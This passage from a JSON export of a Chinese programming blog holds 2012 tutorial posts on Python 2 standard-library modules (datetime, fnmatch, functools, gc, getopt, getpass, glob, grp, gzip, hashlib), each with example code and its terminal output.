#<tt>timedelta</tt>类通过的日期值进行基本的算术，这个步长是1天\nprint 'One day  :', one_day</p>\n\n<p>yesterday = today - one_day\nprint 'Yesterday:', yesterday</p>\n\n<p>tomorrow = today + one_day\nprint 'Tomorrow :', tomorrow</p>\n\n<p>print 'tomorrow - yesterday:', tomorrow - yesterday   #日期计算，当然也可以使用比较计算\nprint 'yesterday - tomorrow:', yesterday - tomorrow\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>Today    : 2012-06-12\nOne day  : 1 day, 0:00:00\nYesterday: 2012-06-11\nTomorrow : 2012-06-13\ntomorrow - yesterday: 2 days, 0:00:00\nyesterday - tomorrow: -2 days, 0:00:00</p>\n\n<p><pre class=\"sh_python\">\nimport datetime</p>\n\n<p>print 'Now    :', datetime.datetime.now() #datetime.datetime结合了日期和时间,合并也可以这样：datetime.datetime.combine(datetime.date.today(), datetime.time(1, 2, 3))\nprint 'Today  :', datetime.datetime.today()\nprint 'UTC Now:', datetime.datetime.utcnow()</p>\n\n<p>d = datetime.datetime.now()\nfor attr in [ 'year', 'month', 'day', 'hour', 'minute', 'second', 'microsecond']:\n    print attr, ':', getattr(d, attr)\n</pre></p>\n\n<p>结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nNow    : 2012-06-12 15:31:49.960739  #精确到微秒\nToday  : 2012-06-12 15:31:49.961110\nUTC Now: 2012-06-12 07:31:49.961128\nyear : 2012\nmonth : 6\nday : 12\nhour : 15\nminute : 31\nsecond : 49\nmicrosecond : 961134</p>\n\n<p><pre class=\"sh_python\">\nimport datetime</p>\n\n<p>format = \"%a %b %d %H:%M:%S %Y\" #想格式化成： 星期几的简称 月简称  一个月的第几天（01..31)  小时 分 秒 年</p>\n\n<p>today = datetime.datetime.today()\nprint 'ISO     :', today</p>\n\n<p>s = today.strftime(format)\nprint 'strftime:', s</p>\n\n<p>d = datetime.datetime.strptime(s, format)\nprint 'strptime:', d.strftime(format)\n</pre>\n结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nISO     : 2012-06-12 15:34:48.377180\nstrftime: Tue Jun 12 15:34:48 2012\nstrptime: Tue Jun 12 15:34:48 2012</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 170,
    "title": "关于fnmatch研究",
    "category": "linux基础",
    "tags": [
      "fnmatch"
    ],
    "url": "/archives/guanyufnmatchyanjiu/",
    "content": "<p>前言：fnmatch是一个底层比较文件名匹配的模块</p>\n\n<p><pre class=\"sh_python\">\nimport fnmatch</p>\n\n<p>pattern = 'FNMATCH_*.PY'  #要匹配的字符串\nprint 'Pattern :', pattern\nprint</p>\n\n<p>for name in ['test.py','fnmatch_fn.py','FNMATCH_fn.PY']:\n    print 'Filename: %-25s %s' % (name, fnmatch.fnmatch(name, pattern))\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nPattern : FNMATCH_*.PY</p>\n\n<p>Filename: test.py                   False\nFilename: fnmatch_fn.py             False #大小写敏感，失败\nFilename: FNMATCH_fn.PY             True  #匹配成功</p>\n\n<p>注：要强制区分大小写的比较，无论文件系统和操作系统设置，使用<tt>fnmatchcas</tt>e</p>\n\n<p><pre class=\"sh_python\">\nimport fnmatch</p>\n\n<p>pattern = 'FNMATCH_*.PY'\nlist = ['test.py','fnmatch_fn.py','FNMATCH_fn.PY']\nprint 'Matches :', fnmatch.filter(list, pattern) #过滤，只留下匹配项\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport fnmatch</p>\n\n<p>pattern = 'FNMATCH_*.PY'\nprint 'Pattern :', pattern\nprint 'Regex   :', fnmatch.translate(pattern)  # 这事公共的API，用来转换glob模式到一个正则表达式\n</pre></p>\n\n<p>执行：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nPattern : FNMATCH_*.PY\nRegex   : FNMATCH\\_.*\\.PY\\Z(?ms)</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 171,
    "title": "关于functools研究",
    "category": "python模块研究",
    "tags": [
      "cmp_to_key",
      "Comparison",
      "functools",
      "partial",
      "total_ordering",
      "wraps"
    ],
    "url": "/archives/guanyufunctoolsyanjiu/",
    "content": "<p>前言：functools是一些操作功能公据的集合，需要python2.5或者以上版本</p>\n\n<p><strong>1 partial 我的理解是凝固函数的局部参数</strong></p>\n\n<p><pre class=\"sh_python\">\nfrom functools import *</p>\n\n<p>def test_func(arg1, arg2):\n   return arg1+arg2\npartial_test_func = partial(test_func, 1) #给第一个参数设置默认值1 \nprint test_func(1,2)  \nprint partial_test_func(2) #其实效果和上面的一样\nprint type(test_func)\nprint type(partial_test_func)\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n3\n3\n&lt;type 'function'&gt;\n&lt;type 'functools.partial'&gt;\n<strong>2 update_wrapper  把被封装函数的__name__、__module__、__doc__和 __dict__都复制到封装函数</strong></p>\n\n<p><pre class=\"sh_python\">\nimport functools</p>\n\n<p>def myfunc(a, b=2):\n    \"\"\"Docstring for myfunc().\"\"\"\n    print '\\tcalled myfunc with:', (a, b)\n    return</p>\n\n<p>def show_details(name, f):\n    \"\"\"Show details of a callable object.\"\"\"\n    print '%s:' % name\n    print '\\tobject:', f\n    print '\\t__name__:', \n    try:\n        print f.__name__\n    except AttributeError:\n        print '(no __name__)'\n    print '\\t__doc__', repr(f.__doc__)\n    print\n    return</p>\n\n<p>show_details('myfunc', myfunc)</p>\n\n<p>p1 = functools.partial(myfunc, b=4)\nshow_details('raw wrapper', p1)</p>\n\n<p>print 'Updating wrapper:'\nprint '\\tassign:', functools.WRAPPER_ASSIGNMENTS\nprint '\\tupdate:', functools.WRAPPER_UPDATES\nprint</p>\n\n<p>functools.update_wrapper(p1, myfunc)\nshow_details('updated wrapper', p1)\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行过程：</p>\n\n<p>myfunc:\nobject: &lt;function myfunc at 0xb74ddae4&gt;\n__name__: myfunc\n__doc__ 'Docstring for myfunc().'</p>\n\n<p>raw wrapper:\nobject: &lt;functools.partial object at 0xb74e14b4&gt;\n__name__: (no __name__)\n__doc__ 'partial(func, *args, **keywords) - new function with partial application\\n    of the given arguments and keywords.\\n'</p>\n\n<p>Updating wrapper:\nassign: ('__module__', '__name__', '__doc__')  #这些属性从myfunc继承\nupdate: ('__dict__',)   #因为继承属性内置__dice__更新了</p>\n\n<p>updated wrapper:\nobject: &lt;functools.partial object at 0xb74e14b4&gt; #还是原来的属性\n__name__: myfunc #属性继承了\n__doc__ 'Docstring for myfunc().' #属性继承了<strong>\n3 wraps 其实也就是相当于在调用了<tt>partial，使用wraps可以把整个function的属性都带上</tt></strong></p>\n\n<p><strong><pre class=\"sh_python\"></strong>\nimport functools</p>\n\n<p>def show_details(name, f):\n    \"\"\"Show details of a callable object.\"\"\"\n    print '%s:' % name\n    print '\\tobject:', f\n    print '\\t__name__:', \n    try:\n        print f.__name__\n    except AttributeError:\n        print '(no __name__)'\n    print '\\t__doc__', repr(f.__doc__)\n    print\n    return</p>\n\n<p>def simple_decorator(f):\n    @functools.wraps(f)\n    def decorated(a='decorated defaults', b=1):\n        print '\\tdecorated:', (a, b)\n        print '\\t',\n        f(a, b=b)\n        return\n    return decorated</p>\n\n<p>def myfunc(a, b=2):\n    print '\\tmyfunc:', (a,b)\n    return</p>\n\n<p>show_details('myfunc', myfunc)\nmyfunc('unwrapped, default b')\nmyfunc('unwrapped, passing b', 3)\nprint</p>\n\n<p>wrapped_myfunc = simple_decorator(myfunc) #继承myfunc的属性\nshow_details('wrapped_myfunc', wrapped_myfunc)\nwrapped_myfunc()\nwrapped_myfunc('args to decorated', 4)\n<strong></pre>\n</strong></p>\n\n<p>运行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nmyfunc:\nobject: &lt;function myfunc at 0xb72e4c6c&gt;\n__name__: myfunc\n__doc__ None</p>\n\n<p>myfunc: ('unwrapped, default b', 2)\nmyfunc: ('unwrapped, passing b', 3)</p>\n\n<p>wrapped_myfunc:\nobject: &lt;function myfunc at 0xb72e4ca4&gt;\n__name__: myfunc\n__doc__ None</p>\n\n<p>decorated: ('decorated defaults', 1) #包含参数设定a='decorated defaults', b=1，而不在是a,b=2\nmyfunc: ('decorated defaults', 1) #默认参数都没有变\ndecorated: ('args to decorated', 4)\nmyfunc: ('args to decorated', 4) #参数都变了\n<strong>4 total_ordering使用内置的比较属性</strong></p>\n\n<p><pre class=\"sh_python\">\nimport functools\nimport inspect  #主要用来模块，框架，函数等进行类型检查，获取类或函数的参数的信息，获取源码和获取类或函数的参数的信息\nfrom pprint import pprint</p>\n\n<p>@functools.total_ordering\nclass MyObject(object):\n    def __init__(self, val):\n        self.val = val\n    def __eq__(self, other):\n        print '  testing __eq__(%s, %s)' % (self.val, other.val)\n        return self.val == other.val\n    def __gt__(self, other):\n        print '  testing __gt__(%s, %s)' % (self.val, other.val)\n        return self.val &gt; other.val</p>\n\n<p>print 'Methods:\\n'\npprint(inspect.getmembers(MyObject, inspect.ismethod))  #要是不加inspect.ismethod的话，会将对象的所有默认属性都列出来</p>\n\n<p>a = MyObject(1)\nb = MyObject(2)</p>\n\n<p>print '\\nComparisons:'\nfor expr in [ 'a &lt; b', 'a &lt;= b', 'a == b', 'a &gt;= b', 'a &gt; b' ]:\n    print '\\n%-6s:' % expr\n    result = eval(expr)\n    print '  result of %s: %s' % (expr, result)\n</pre></p>\n\n<p>结果：</p>\n\n<p>Methods:</p>\n\n<p>[('__eq__', &lt;unbound method MyObject.__eq__&gt;),\n('__ge__', &lt;unbound method MyObject.__ge__&gt;),\n('__gt__', &lt;unbound method MyObject.__gt__&gt;),\n('__init__', &lt;unbound method MyObject.__init__&gt;),\n('__le__', &lt;unbound method MyObject.__le__&gt;),\n('__lt__', &lt;unbound method MyObject.__lt__&gt;)]</p>\n\n<p>Comparisons:</p>\n\n<p>a &lt; b :\ntesting __gt__(2, 1)\nresult of a &lt; b: True</p>\n\n<p>a &lt;= b:\ntesting __gt__(1, 2)\nresult of a &lt;= b: True</p>\n\n<p>a == b:\ntesting __eq__(1, 2)\nresult of a == b: False</p>\n\n<p>a &gt;= b:\ntesting __gt__(2, 1)\nresult of a &gt;= b: False</p>\n\n<p>a &gt; b :\ntesting __gt__(1, 2)\nresult of a &gt; b: False\n<strong>5 <tt>cmp_to_key</tt>排序</strong></p>\n\n<p><pre class=\"sh_python\">\nimport functools</p>\n\n<p>class MyObject(object):\n    def __init__(self, val):\n        self.val = val\n    def __str__(self):\n        return 'MyObject(%s)' % self.val</p>\n\n<p>def compare_obj(a, b):\n    print 'comparing %s and %s' % (a, b)\n    return cmp(a.val, b.val)</p>\n\n<p>get_key = functools.cmp_to_key(compare_obj)</p>\n\n<p>def get_key_wrapper(o):\n    \"\"\"Wrapper function for get_key to allow for print statements.\n    \"\"\"\n    new_key = get_key(o)\n    print 'key_wrapper(%s) -&gt; %s' % (o, new_key)\n    return new_key</p>\n\n<p>objs = [ MyObject(x) for x in xrange(5, 0, -1) ]</p>\n\n<p>for o in sorted(objs, key=get_key_wrapper):\n    print o\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nkey_wrapper(MyObject(5)) -&gt; &lt;functools.K object at 0xb73c342c&gt;\nkey_wrapper(MyObject(4)) -&gt; &lt;functools.K object at 0xb73c344c&gt;\nkey_wrapper(MyObject(3)) -&gt; &lt;functools.K object at 0xb73c346c&gt;\nkey_wrapper(MyObject(2)) -&gt; &lt;functools.K object at 0xb73c348c&gt;\nkey_wrapper(MyObject(1)) -&gt; &lt;functools.K object at 0xb73c34ac&gt;\ncomparing MyObject(4) and MyObject(5)\ncomparing MyObject(3) and MyObject(4)\ncomparing MyObject(2) and MyObject(3)\ncomparing MyObject(1) and MyObject(2)\nMyObject(1)\nMyObject(2)\nMyObject(3)\nMyObject(4)\nMyObject(5)</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "12"
    }
  },
  {
    "id": 172,
    "title": "关于gc研究",
    "category": "python模块研究",
    "tags": [
      "gc"
    ],
    "url": "/archives/guanyugcyanjiu/",
    "content": "<p>前言：gc主要是管理Python对象使用的内存,也就是垃圾回收</p>\n\n<p><pre class=\"sh_python\">\nimport gc\nimport pprint</p>\n\n<p>class Graph(object):\n    def __init__(self, name):\n        self.name = name\n        self.next = None\n    def set_next(self, next):\n        print 'Linking nodes %s.next = %s' % (self, next)\n        self.next = next\n    def __repr__(self):  #python元类，简单的理解就是控制你的对象在被<code>repr</code>函数调用的时候返回的内容\n        return '%s(%s)' % (self.__class__.__name__, self.name)</p>\n\n<p>one = Graph('one')\ntwo = Graph('two')\nthree = Graph('three')\none.set_next(two)\ntwo.set_next(three)\nthree.set_next(one)</p>\n\n<p>print\nprint 'three refers to:'\nfor r in gc.get_referents(three): #跟踪参考，返回对象名单\n    pprint.pprint(r)\none = two = three = None  #删除引用这个模块的命名空间\nfor i in range(2):\n    print 'Collecting %d ...' % i\n    n = gc.collect() #\n    print 'Unreachable objects:', n\n    print 'Remaining Garbage:', \n    pprint.pprint(gc.garbage) #剩余垃圾的列表\n    print\n\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nLinking nodes Graph(one).next = Graph(two)  #根据__repr__显示效果：类名(实例.name)\nLinking nodes Graph(two).next = Graph(three)\nLinking nodes Graph(three).next = Graph(one)</p>\n\n<p>three refers to:\n{'name': 'three', 'next': Graph(one)}\n&lt;class '__main__.Graph'&gt;</p>\n\n<p>Collecting 0 ...\nUnreachable objects: 6  #因为有3个实例属性字典的对象\nRemaining Garbage:[]</p>\n\n<p>Collecting 1 ...\nUnreachable objects: 0\nRemaining Garbage:[]</p>\n\n<p>注：如果有<tt>__del__</tt>这个方法：</p>\n\n<p><pre class=\"sh_python\">\nimport gc\nimport pprint</p>\n\n<p>class Graph(object):\n    def __init__(self, name):\n        self.name = name\n        self.next = None\n    def set_next(self, next):\n        print 'Linking nodes %s.next = %s' % (self, next)\n        self.next = next\n    def __repr__(self):\n        return '%s(%s)' % (self.__class__.__name__, self.name)\n    def __del__(self):  #类似于析构函数，把对象销毁\n        print '%s.__del__()' % self</p>\n\n<p>one = Graph('one')\ntwo = Graph('two')\nthree = Graph('three')\none.set_next(two)\ntwo.set_next(three)\nthree.set_next(one)</p>\n\n<p>one = two = three = None</p>\n\n<p>print\nprint 'Collecting...'\nn = gc.collect()\nprint 'Unreachable objects:', n\nprint 'Remaining Garbage:', \npprint.pprint(gc.garbage)</p>\n\n<p>print\nprint 'Breaking the cycle'\ngc.garbage[0].set_next(None)   #打破循环\nprint 'Removing references in gc.garbage'\ndel gc.garbage[:]  #删除这些垃圾</p>\n\n<p>print\nprint 'Collecting...'\nn = gc.collect()\nprint 'Unreachable objects:', n\nprint 'Remaining Garbage:', \npprint.pprint(gc.garbage)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nLinking nodes Graph(one).next = Graph(two)\nLinking nodes Graph(two).next = Graph(three)\nLinking nodes Graph(three).next = Graph(one)</p>\n\n<p>Collecting...\nUnreachable objects: 6\nRemaining Garbage:[Graph(one), Graph(two), Graph(three)]  #没有回收成功</p>\n\n<p>Breaking the cycle\nLinking nodes Graph(one).next = None\nRemoving references in gc.garbage\nGraph(two).__del__()  #删除会触发__repr__\nGraph(three).__del__()\nGraph(one).__del__()</p>\n\n<p>Collecting...\nUnreachable objects: 0\nRemaining Garbage:[]</p>\n\n<p><pre class=\"sh_python\">\nimport gc\nimport pprint\nimport sys</p>\n\n<p>try:\n    threshold = int(sys.argv[1])\nexcept (IndexError, ValueError, TypeError):\n    print 'Missing or invalid threshold, using default'\n    threshold = 5</p>\n\n<p>class MyObj(object):\n    def __init__(self, name):\n        self.name = name\n        print 'Created', self.name</p>\n\n<p>gc.set_debug(gc.DEBUG_STATS) #设定debug方式</p>\n\n<p>gc.set_threshold(threshold, 1, 1) #默认的是(700,10,10)\nprint 'Thresholds:', gc.get_threshold()</p>\n\n<p>print 'Clear the collector by forcing a run'\ngc.collect()\nprint</p>\n\n<p>print 'Creating objects'\nobjs = []\nfor i in range(10):\n    objs.append(MyObj(i))  #在这个创建过程中根据阀值，比如sys.argv[1]＝5和sys.argv[1]＝2 后者频繁的多\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport gc</p>\n\n<p>flags = (gc.DEBUG_COLLECTABLE |\n         gc.DEBUG_UNCOLLECTABLE |\n         gc.DEBUG_OBJECTS\n         )  #暴露的内部运作，以上暴露其中的可达的属性，不可达的属性和对象属性的相关信息\ngc.set_debug(flags)</p>\n\n<p>class Graph(object):\n    def __init__(self, name):\n        self.name = name\n        self.next = None\n        print 'Creating %s 0x%x (%s)' % (self.__class__.__name__, id(self), name)\n    def set_next(self, next):\n        print 'Linking nodes %s.next = %s' % (self, next)\n        self.next = next\n    def __repr__(self):\n        return '%s(%s)' % (self.__class__.__name__, self.name)</p>\n\n<p>class CleanupGraph(Graph):\n    def __del__(self):\n        print '%s.__del__()' % self</p>\n\n<p># Construct a graph cycle\none = Graph('one')\ntwo = Graph('two')\none.set_next(two)\ntwo.set_next(one)</p>\n\n<p>three = CleanupGraph('three')\nfour = CleanupGraph('four')\nfive = CleanupGraph('five')\nfour.set_next(five)\nfive.set_next(four)\none = two = three = four = five = None\nprint\nprint 'Collecting'\ngc.collect()\nprint 'Done'\n</pre>\ndongwm@linux-dongwm:~&gt; python test.py\nCreating Graph 0xb733522c (one)\nCreating Graph 0xb733524c (two)\nLinking nodes Graph(one).next = Graph(two)\nLinking nodes Graph(two).next = Graph(one)\nCreating CleanupGraph 0xb733526c (three)\nCreating CleanupGraph 0xb733528c (four)\nCreating CleanupGraph 0xb73352ac (five)\nLinking nodes CleanupGraph(four).next = CleanupGraph(five)\nLinking nodes CleanupGraph(five).next = CleanupGraph(four)\nCleanupGraph(three).__del__()</p>\n\n<p>Collecting\ngc: collectable &lt;Graph 0xb733522c&gt;\ngc: collectable &lt;Graph 0xb733524c&gt;\ngc: collectable &lt;dict 0xb733324c&gt;\ngc: collectable &lt;dict 0xb733357c&gt;\ngc: uncollectable &lt;CleanupGraph 0xb733528c&gt;\ngc: uncollectable &lt;CleanupGraph 0xb73352ac&gt;\ngc: uncollectable &lt;dict 0xb7333604&gt;\ngc: uncollectable &lt;dict 0xb733379c&gt;\nDone</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 173,
    "title": "关于getopt研究",
    "category": "python模块研究",
    "tags": [
      "getopt",
      "gnu_getopt"
    ],
    "url": "/archives/guanyugetoptyanjiu/",
    "content": "<p>前言：getopt是一个命令行选项解析模块</p>\n\n<p><pre class=\"sh_python\">\nimport getopt\nprint getopt.getopt(['-a', '-bval', '-c', 'val'], 'ab:c:')  #其中包含2个参数，前面的是具体想象和参数，后面是相应的选项，因为假如前面的\"-bval\"，但是怎么知道是'-b','-bv'还是'-bva'\nprint                                                       #那么后面指定了 b:\nprint getopt.getopt([ '--noarg', '--witharg', 'val', '--witharg2=another' ],'',\n                    [ 'noarg', 'witharg=', 'witharg2=' ])  #长选项\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n([('-a', ''), ('-b', 'val'), ('-c', 'val')], [])\n([('--noarg', ''), ('--witharg', 'val'), ('--witharg2', 'another')], [])</p>\n\n<p><pre class=\"sh_python\">\nimport getopt\nimport sys</p>\n\n<p>version = '1.0'\nverbose = False\noutput_filename = 'default.out'</p>\n\n<p>print 'ARGV      :', sys.argv[1:]</p>\n\n<p>options, remainder = getopt.gnu_getopt(sys.argv[1:], 'o:v', ['output=',  #getopt.gnu_getopt命令行中的任何顺序混合选项和非选项参数\n                                                             'verbose',\n                                                             'version=',\n                                                             ])\nprint 'OPTIONS   :', options</p>\n\n<p>for opt, arg in options:\n    if opt in ('-o', '--output'):\n        output_filename = arg\n    elif opt in ('-v', '--verbose'):\n        verbose = True\n    elif opt == '--version':\n        version = arg</p>\n\n<p>print 'VERSION   :', version\nprint 'VERBOSE   :', verbose\nprint 'OUTPUT    :', output_filename\nprint 'REMAINING :', remainder\n</pre></p>\n\n<p>一些执行操作：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py -v not_an_option --output testfile\nARGV      : ['-v', 'not_an_option', '--output', 'testfile']\nOPTIONS   : [('-v', ''), ('--output', 'testfile')]\nVERSION   : 1.0\nVERBOSE   : True\nOUTPUT    : testfile\nREMAINING : ['not_an_option']\ndongwm@linux-dongwm:~&gt; python test.py -v -- --output testfile\nARGV      : ['-v', '--', '--output', 'testfile']\nOPTIONS   : [('-v', '')]\nVERSION   : 1.0\nVERBOSE   : True\nOUTPUT    : default.out\nREMAINING : ['--output', 'testfile']</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 174,
    "title": "关于getpass研究",
    "category": "python模块研究",
    "tags": [
      "getpass"
    ],
    "url": "/archives/guanyugetpassyanjiu/",
    "content": "<p>前言：通过终端与用户交互时，getpass提示用户输入密码，并且不明文显示输入的数据</p>\n\n<p><pre class=\"sh_python\">\nimport getpass</p>\n\n<p>p = getpass.getpass(prompt='Do you love me?')\nif p.lower() == 'yes':\n    print 'Right.'\nelse:\n    print 'oh! no'\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nDo you love me?\nRight.\ndongwm@linux-dongwm:~&gt; python test.py\nDo you love me?\noh! no\n<pre class=\"sh_python\">\nimport getpass\nimport sys</p>\n\n<p>if sys.stdin.isatty(): #当发现这是一个终端的时候 \n    p = getpass.getpass('Using getpass: ')\nelse:  #当非终端，比如伪终端\n    print 'Using readline'\n    p = sys.stdin.readline().rstrip()</p>\n\n<p>print 'Read: ', p\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; echo 'sdds' |python test.py\nUsing readline\nRead:  sdds\ndongwm@linux-dongwm:~&gt; python test.py\nUsing getpass:\nRead:  sdds</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 175,
    "title": "关于glob研究",
    "category": "python模块研究",
    "tags": [
      "glob"
    ],
    "url": "/archives/guanyuglobyanjiu/",
    "content": "<p>前言：glob使用shell规则进行模式匹配</p>\n\n<p>dongwm@linux-dongwm:~&gt; ls test/*   #shell 查找文件\ntest/file1  test/file2  test/file3</p>\n\n<p>test/testdir:\nfile</p>\n\n<p><pre class=\"sh_python\">\nimport glob\nfor name in glob.glob('test/*'):  #类似于  ls test/*\n    print name\n</pre></p>\n\n<p>执行结果：\ndongwm@linux-dongwm:~&gt; python !$\npython test.py\ntest/file3\ntest/testdir\ntest/file2\ntest/file1</p>\n\n<p><pre class=\"sh_python\">\nimport glob</p>\n\n<p>print 'Named explicitly:'\nfor name in glob.glob('test/testdir/*'):\n    print '\\t', name</p>\n\n<p>print 'Named with wildcard:'\nfor name in glob.glob('test/*/*'):  #通配符*\n    print '\\t', name\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nNamed explicitly:\ntest/testdir/file\nNamed with wildcard:\ntest/testdir/file\n<pre class=\"sh_python\">\nimport glob\nprint 'Single Character Wildcard'\nfor name in glob.glob('test/file?'):  #'?'匹配一个字符\n    print name\nprint 'Character Ranges'\nfor name in glob.glob('test/*[0-9]'): #匹配一个数字范围0－9\n    print name\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 176,
    "title": "关于grp研究",
    "category": "python模块研究",
    "tags": [
      "grp"
    ],
    "url": "/archives/guanyugrpyanjiu/",
    "content": "<p>前言：grp是从Unix组数据库中读取组数据,通常是<tt>/etc/group</tt></p>\n\n<p><pre class=\"sh_python\">\nimport grp\nimport operator  #主要是运算符操作模块\nall_groups = grp.getgrall()  #得到所有系统的组信息\ninteresting_groups = sorted((g   #排序\n                            for g in all_groups \n                            if not g.gr_name.startswith('_')),  #去掉排除'_'开头的组\n                            key=operator.attrgetter('gr_name'))  #这个函数返回一个可调用对象,取此对象的attr属性值（tuple方式）</p>\n\n<p># Find the longest length for the name\nname_length = max(len(g.gr_name) for g in interesting_groups) + 1</p>\n\n<p># Print report headers\nfmt = '%-*s %4s %10s %s'\nprint fmt % (name_length, 'Name', \n             'GID', \n             'Password',\n             'Members')\nprint '-' * name_length, '----', '-' * 10, '-' * 30</p>\n\n<p># Print the data\nfor g in interesting_groups:\n    print fmt % (name_length, g.gr_name, \n                 g.gr_gid, \n                 g.gr_passwd,\n                 ', '.join(g.gr_mem))\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport grp\nimport sys</p>\n\n<p>username = sys.argv[1]\ngroups = [g.gr_name for g in grp.getgrall() if username in g.gr_mem] #查找某用户属于那个组的列表\nprint username, 'belongs to:', ', '.join(groups) \n~\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py dongwm\ndongwm belongs to: vboxusers, video</p>\n\n<p><pre class=\"sh_python\">\nimport grp\nimport os</p>\n\n<p>name = 'root'\ninfo = grp.getgrnam(name)  #root用户的组信息\nprint 'Name    :', info.gr_name\nprint 'GID     :', info.gr_gid\nprint 'Password:', info.gr_passwd\nprint 'Members :', ', '.join(info.gr_mem)\ngid = os.getgid()  #当前用户gid\ngroup_info = grp.getgrgid(gid)\nprint 'Currently running with GID=%s name=%s' % (gid, group_info.gr_name)\nfilename=os.path.basename(__file__) #当前文件名\nstat_info = os.stat(filename)\nowner = grp.getgrgid(stat_info.st_gid).gr_name #查找文件的所有者\nprint '%s is owned by %s (%s)' % (filename, owner, stat_info.st_gid)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nName    : root\nGID     : 0\nPassword: x\nMembers :\nCurrently running with GID=100 name=users\ntest.py is owned by users (100)</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 177,
    "title": "关于gzip研究",
    "category": "python模块研究",
    "tags": [
      "gzip"
    ],
    "url": "/archives/guanyugzipyanjiu/",
    "content": "<p>前言：gzip是一个读，写GNU zip文件的模块，使用<tt>zlib的</tt>数据压缩和解压</p>\n\n<p><pre class=\"sh_python\">\nimport gzip\nimport os</p>\n\n<p>outfilename = 'example.txt.gz'  #输出的gz文件\noutput = gzip.open(outfilename, 'wb')    #可以有个compresslevel=i i越大压缩率越高，但是越慢\ntry:\n    output.write('Contents of the example file go here.\\n')  #这个其实是写在example.txt文件中\nfinally:\n    output.close()</p>\n\n<p>print outfilename, 'contains', os.stat(outfilename).st_size, 'bytes of compressed data'\nos.system('file -b --mime %s' % outfilename)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport gzip\nfrom cStringIO import StringIO\nimport binascii</p>\n\n<p>uncompressed_data = 'The same line, over and over.\\n' * 10\nprint 'UNCOMPRESSED:', len(uncompressed_data)</p>\n\n<p>buf = StringIO()  #基于流\nf = gzip.GzipFile(mode='wb', fileobj=buf)\ntry:\n    f.write(uncompressed_data)\nfinally:\n    f.close()</p>\n\n<p>compressed_data = buf.getvalue()\nprint 'COMPRESSED:', len(compressed_data)  #压缩后的大小\nprint binascii.hexlify(compressed_data)</p>\n\n<p>inbuffer = StringIO(compressed_data)\nf = gzip.GzipFile(mode='rb', fileobj=inbuffer)\ntry:\n    reread_data = f.read(len(uncompressed_data))\nfinally:\n    f.close()</p>\n\n<p>print\nprint 'RE-READ:', len(reread_data)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nUNCOMPRESSED: 300\nCOMPRESSED: 51\n1f8b08007112d84f02ff0bc94855284ecc4d55c8c9cc4bd551c82f4b2d5248cc4b0133f4b8424665916401d3e717802c010000</p>\n\n<p>RE-READ: 300</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 178,
    "title": "关于hashlib研究",
    "category": "python模块研究",
    "tags": [
      "hashlib",
      "hexdigest"
    ],
    "url": "/archives/guanyuhashlibyanjiu/",
    "content": "<p>前言：hashlib是一个加密hash和消息摘要的模块，而且建议单独使用sha和md5，支持：md5，sha1，sha224，sha256，sha384，sha512等</p>\n\n<p><pre class=\"sh_python\">\nimport hashlib\ntest='Traditional Linux systems use SysV init for starting the system: running init scripts to start and stop services as well as manage system runlevels and'</p>\n\n<p>h = hashlib.md5()  #使用md5\nh.update(test)  #更新消息，这个update整个文件(这里是test,但是把test一部分一部分的update，最后计算的结果是一样的)\nprint h.hexdigest()  #计算消息摘要</p>\n\n<p>h = hashlib.sha256()  #使用sha256\nh.update(test) #更新消息\nprint h.hexdigest() </p>\n\n<p>h = hashlib.new('sha256')  #使用new方式，可以灵活的指定算法 和上面的效果一样\nh.update(test)  \nprint h.hexdigest()\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "13"
    }
  },
  {
    "id": 179,
    "title": "关于heapq",
    "category": "python模块研究",
    "tags": [
      "heapq"
    ],
    "url": "/archives/guanyuheapq/",
